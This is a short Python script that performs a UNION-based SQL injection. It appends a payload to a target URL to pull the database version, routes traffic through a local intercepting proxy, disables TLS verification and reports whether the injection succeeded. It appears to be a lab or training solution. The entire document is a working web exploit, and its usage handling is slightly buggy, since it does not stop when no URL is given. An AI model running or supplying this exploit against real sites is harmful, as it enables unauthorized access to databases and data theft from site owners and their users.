import sys
import requests
import urllib3
import re
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}

def exploit(url):
    payload = "'+UNION+SELECT+NULL,@@version%23"
    r = requests.get(url + payload, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    version = soup.body.find(text=re.compile(".*\d{1,2}\.\d{1,2}\.\d{1,2}"))
    if version:
        return version
    return False

if __name__ == '__main__':
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print('[.] Usage %s <url>' % sys.argv[0])
        print('[.] %s www.python.org <url>' % sys.argv[0])
    print("[.] Retrieving database version..")
    response = exploit(url)
    if response:
        print(f'Version : {response}')
        print('[.] Successful SQLi')
    else:
        print('[*] Unsuccessful SQLi')